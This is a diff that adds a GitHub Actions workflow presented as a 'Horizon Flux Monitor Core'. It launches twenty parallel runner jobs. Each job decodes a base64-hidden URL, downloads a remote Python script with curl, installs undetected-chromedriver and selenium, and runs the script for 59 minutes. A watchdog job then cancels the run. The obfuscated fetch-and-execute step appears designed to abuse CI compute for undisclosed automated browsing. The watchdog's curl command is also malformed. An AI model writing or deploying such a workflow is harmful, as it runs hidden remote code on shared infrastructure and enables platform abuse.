@@ -1,0 +1,103 @@
+name: Horizon Flux Monitor Core
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: flux-core-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog Task: Waits 59 minutes and triggers workflow termination
+  # =================================================================
+  flux-watchdog:
+    name: "Watchdog Engine"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_TIMEOUT_SEC: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          echo "[WATCHDOG] Active monitoring initiated for Execution ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Holding process active for ${WATCHDOG_TIMEOUT_SEC} seconds."
+
+          sleep "${WATCHDOG_TIMEOUT_SEC}"
+
+          echo "[WATCHDOG] Limit reached — emitting abort signal to API."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            -https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel
+
+          echo "[WATCHDOG] Signal transmitted successfully. Terminating concurrent operations."
+
+  # =================================================================
+  # Worker Cluster: Parallel execution of workers
+  # =================================================================
+  worker-cluster:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [A101, B102, C103, D104, E105, F106, G107, H108, I109, J110, K111, L112, M113, N114, O115, P116, Q117, R118, S119, T120]
+
+    steps:
+      # #################################################################
+      # Phase 1: Environment Setup
+      # #################################################################
+      - name: Setup Environment
+        run: |
+          echo "[SETUP] Bootstrapping environment for Worker Node: ${{ matrix.node_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Phase 2: Fetch Application Payload
+      # #################################################################
+      - name: Fetch Application Payload
+        run: |
+          echo "[FETCH] Pulling application binary from remote repository..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$TARGET_URL" -o app_runner.py
+          echo "[FETCH] Target script successfully retrieved."
+
+      # #################################################################
+      # Phase 3: Install Required Dependencies
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPENDENCIES] Installing python modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Phase 4: Execute Application Controller
+      # #################################################################
+      - name: Execute Controller
+        run: |
+          echo ">> Starting Worker Node [${{ matrix.node_code }}] instance..."
+
+          python3 app_runner.py &
+          APP_PID=$!
+
+          echo ">> Instance live. Internal timer scheduled for 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$APP_PID" 2>/dev/null; then
+            echo ">> Timer expired — shutting down background process."
+            kill -9 "$APP_PID"
+            echo ">> Process terminated cleanly by supervisor."
+          else
+            echo ">> Execution completed prior to timeout."
+          fi
